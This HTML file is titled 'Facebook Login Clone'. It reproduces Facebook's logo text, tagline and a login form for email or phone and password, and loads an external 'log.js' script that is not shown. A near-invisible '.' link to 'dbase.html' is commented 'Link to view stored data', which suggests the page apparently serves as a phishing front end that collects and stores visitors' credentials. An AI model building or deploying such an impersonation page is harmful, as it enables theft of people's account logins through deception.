<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Facebook Login Clone</title>
    <link rel="stylesheet" href="stysheet.css" />
  </head>
  <body>
    <div class="container">
      <h1 class="logo">facebook</h1>
      <p class="subtext">
        Connect with friends and the world around you on Facebook.
      </p>
      <div class="login-box">
        <form id="loginForm">
          <input
            type="text"
            name="email"
            id="email"
            placeholder="Email or phone number"
            required
          />
          <input
            type="password"
            name="password"
            id="password"
            placeholder="Password"
            required
          />
          <button type="submit" class="login-btn">Log In</button>
        </form>
        <a href="#" class="forgot-password">Forgot password?</a>
        <hr />
        <button class="create-account">Create new account</button>
      </div>
      <p class="create-page">
        <a href="dbase.html"><b>Create a Page</b></a> for a celebrity, brand, or
        business.
      </p>
      <br />
      <a href="dbase.html">.</a>
      <!-- Link to view stored data -->
    </div>

    <script src="log.js"></script>
    <!-- External JS -->
  </body>
</html>
